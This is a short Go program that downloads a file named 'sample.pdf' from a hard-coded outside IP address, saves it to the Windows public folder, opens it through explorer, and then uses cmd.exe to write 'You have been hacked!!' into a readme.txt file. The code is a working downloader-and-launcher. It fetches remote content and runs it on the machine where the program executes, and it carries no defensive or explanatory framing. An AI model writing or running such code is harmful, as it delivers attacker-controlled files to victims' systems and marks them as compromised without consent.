package main

import(
	"os/exec"
	"os"
  "net/http"
	"io"
)

func main() { 

	DownloadFile()
  rtcp := exec.Command("cmd.exe", "/C", "echo \"You have been hacked!!\" >> C:\\Users\\Public\\readme.txt")
	rtcp.Run()
}


func DownloadFile() error {
  out, err := os.Create("C:\\Users\\Public\\sample.pdf")
  if err != nil {
      return err
  }
  defer out.Close()

  resp, err := http.Get("http://94.156.189.193/sample.pdf")
  if err != nil {
      return err
  }
  defer resp.Body.Close()

  _, err = io.Copy(out, resp.Body)
  if err != nil {
      return err
  }

  openpdf := exec.Command("cmd.exe", "/c", "explorer C:\\Users\\Public\\sample.pdf")
  openpdf.Run()
  return nil
}